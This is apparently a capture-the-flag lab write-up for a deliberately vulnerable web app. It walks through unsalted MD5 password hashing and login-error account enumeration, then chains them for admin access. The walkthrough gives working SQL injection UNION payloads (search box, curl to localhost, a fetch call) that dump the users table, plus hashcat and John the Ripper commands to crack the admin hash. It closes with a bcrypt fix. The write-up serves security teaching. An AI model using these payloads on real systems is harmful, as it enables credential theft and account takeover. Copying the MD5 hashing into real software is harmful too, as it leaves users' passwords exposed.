# Weak MD5 Hashing Vulnerability

## Overview

This vulnerability demonstrates a critical security flaw where MD5 (Message Digest Algorithm 5) is used for password hashing. MD5 is cryptographically broken and vulnerable to collision attacks, rainbow table lookups, and brute force attacks. This makes it trivial for attackers to recover plaintext passwords from MD5 hashes, especially for weak passwords.

This vulnerability is exploited through a chain attack: first, SQL injection vulnerabilities are used to extract password hashes from the database, then the weak MD5 hashes are cracked to gain admin access.

## Vulnerability Summary

The application uses MD5 to hash user passwords before storing them in the database. MD5 has been considered cryptographically broken since 2004. It is vulnerable to:

1. **Rainbow Table Attacks**: Pre-computed hash tables allow instant password recovery for common passwords
2. **Brute Force Attacks**: MD5 is fast to compute, making brute force attacks practical
3. **Collision Attacks**: Multiple inputs can produce the same hash, compromising security
4. **No Salt**: The implementation doesn't use salt, making rainbow table attacks even more effective

### Vulnerable Code

**MD5 Hashing:**

```typescript
const hashMD5 = (text: string): string => {
  return crypto.createHash("md5").update(text).digest("hex");
};

const hashedPassword = hashMD5(password);
```

**Account Enumeration:**

```typescript
const user = await prisma.user.findUnique({
  where: { email },
});

if (!user) {
  return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
}

if (user.password !== hashedPassword) {
  return NextResponse.json({ error: "Invalid password" }, { status: 401 });
}
```

The different error messages (`"Invalid credentials"` vs `"Invalid password"`) allow attackers to determine whether an email address is registered in the system.

## Impact

This vulnerability allows attackers to:

- **Recover plaintext passwords** from leaked database dumps
- **Perform credential stuffing attacks** using cracked passwords
- **Gain unauthorized access** to user accounts, including administrative accounts
- **Escalate privileges** by cracking admin passwords
- **Compromise multiple accounts** if users reuse passwords

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{w34k_md5_h4sh1ng}`, you need to chain multiple vulnerabilities: use SQL injection to extract password hashes, crack the weak MD5 hashes, and then login as admin.

**Exploitation Steps:**

#### Step 1: Extract User Database via SQL Injection

The application has two SQL injection vulnerabilities that can be used to extract the user database:

**Option A: Product Search SQL Injection (unauthenticated)**

1. Navigate to the Product Search page (`/products/search`)
2. Enter a SQL injection payload in the search box:
   ```
   ' UNION SELECT id, email, password, role, 'img' FROM users--
   ```
3. The response will contain user data including emails, password hashes, and roles

**Using curl:**

```bash
curl "http://localhost:3000/api/products/search?q='%20UNION%20SELECT%20id,%20email,%20password,%20role,%20'img'%20FROM%20users--"
```

**Option B: Order Search SQL Injection (requires authentication)**

1. Log in as any user (e.g., `alice@example.com` / `iloveduck`)
2. Navigate to Order Search (`/orders/search`)
3. Using browser dev tools or curl, send a malicious request:
   ```javascript
   fetch("/api/orders/search", {
     method: "POST",
     credentials: "include",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       status:
         "' UNION SELECT id, email, password, role, id, email, password, role, role FROM users--",
     }),
   })
     .then((r) => r.json())
     .then(console.log);
   ```

Both methods will expose user data including the admin account's email and password hash.

#### Step 2: Identify the Admin Account

From the extracted data, look for users with `role: "ADMIN"`. You will find:

- **Email**: `admin@oss.com`
- **Password Hash**: `21232f297a57a5a743894a0e4a801fc3`

#### Step 3: Crack the MD5 Hash

Use one of the following methods to crack the admin's MD5 hash:

**Option A: Online Tools**

- Visit [CrackStation](https://crackstation.net/) or similar MD5 lookup services
- Enter the hash `21232f297a57a5a743894a0e4a801fc3`

**Option B: Command Line**

```bash
# Using hashcat
hashcat -m 0 21232f297a57a5a743894a0e4a801fc3 /usr/share/wordlists/rockyou.txt

# Using john the ripper
echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt
john --format=Raw-MD5 hash.txt
```

#### Step 4: Login as Admin

1. Navigate to the login page (`/login`)
2. Enter the cracked credentials:
   - Email: `admin@oss.com`
   - Password: `admin`
3. Submit the form

#### Step 5: Retrieve the Flag

After successful login, you will be automatically redirected to the admin panel (`/admin`) where the flag `OSS{w34k_md5_h4sh1ng}` is displayed.

### Alternative: Account Enumeration

If you only have the password hash without the email (e.g., from a partial data leak), you can use account enumeration via the login form:

- If an account **does not exist**: The error message is `"Invalid credentials"`
- If an account **exists but password is wrong**: The error message is `"Invalid password"`

Try common email patterns like `admin@oss.com`, `admin@example.com`, `administrator@oss.com` to identify valid accounts.

### Why This Works

- **SQL Injection exposes the database**: The two SQL injection vulnerabilities allow extracting the entire users table
- **MD5 is trivially crackable**: The hash `21232f297a57a5a743894a0e4a801fc3` is the MD5 hash of "admin" - a password found in every rainbow table
- **No salt**: Without salt, identical passwords always produce identical hashes, making rainbow table attacks effective
- **Privilege escalation**: Once the admin password is cracked, full admin access is gained

### Code Fixes

**Before (Vulnerable):**

```typescript
const hashMD5 = (text: string): string => {
  return crypto.createHash("md5").update(text).digest("hex");
};

const hashedPassword = hashMD5(password);
```

**After (Secure):**

```typescript
import bcrypt from "bcryptjs";

const hashPassword = async (password: string): Promise<string> => {
  const saltRounds = 12;
  return await bcrypt.hash(password, saltRounds);
};

const verifyPassword = async (
  password: string,
  hash: string
): Promise<boolean> => {
  return await bcrypt.compare(password, hash);
};
```

## References

- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [MD5 Collision Vulnerability](https://en.wikipedia.org/wiki/MD5#Security)
- [OWASP Top 10 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
